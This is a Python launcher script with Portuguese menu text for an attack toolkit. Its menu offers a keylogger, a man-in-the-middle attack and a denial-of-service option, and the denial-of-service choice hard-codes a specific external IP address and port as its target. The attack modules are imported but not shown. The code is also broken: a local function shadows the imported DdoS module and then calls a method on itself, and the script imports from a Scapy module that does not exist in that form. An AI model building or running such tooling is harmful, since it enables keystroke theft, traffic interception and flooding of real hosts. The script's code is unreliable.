from bhp.man_in_the_middle import MiTM
from bhp.keylogger import keylogger_2
from Scapy import DdoS
import sys


def run():
    return keylogger_2.run()


def main_mitm():
    return MiTM.main()


def DdoS(target_ip, target_port):
    return DdoS.run_ddos()


def main():
    """
    Menu principal para selecionar o tipo de ataque.
    """
    while True:
        print("\033[92m")
        print("""                                                                        
#  8 888888888o.    8888888888',8888' 8 888888888o.   `8.`8888.      ,8' 
#  8 8888    `88.          ,8',8888'  8 8888    `^888. `8.`8888.    ,8'  
#  8 8888     `88         ,8',8888'   8 8888        `88.`8.`8888.  ,8'   
#  8 8888     ,88        ,8',8888'    8 8888         `88 `8.`8888.,8'    
#  8 8888.   ,88'       ,8',8888'     8 8888          88  `8.`88888'     
#  8 888888888P'       ,8',8888'      8 8888          88  .88.`8888.     
#  8 8888`8b          ,8',8888'       8 8888         ,88 .8'`8.`8888.    
#  8 8888 `8b.       ,8',8888'        8 8888        ,88'.8'  `8.`8888.   
#  8 8888   `8b.    ,8',8888'         8 8888    ,o88P' .8'    `8.`8888.  
#  8 8888     `88. ,8',8888888888888  8 888888888P'   .8'      `8.`8888. """)
        print("1. Keylogger")
        print("2. MITM")
        print("3. DOS CENTER")
        print("0. Sair")
        choice = input("Escolha uma opção: ").strip()

        if choice == "1":
            run()
        elif choice == "2":
            main_mitm()
        elif choice == "3":
            target_ip = "162.159.133.234"
            target_port = 80
            DdoS(target_ip, target_port)
        elif choice == "0":
            print("CLOSE CLOSE CLOSE CLOSE ---------------")
            sys.exit(0)
        else:
            print("Opção inválida. Tente novamente.")


if __name__ == "__main__":
    main()
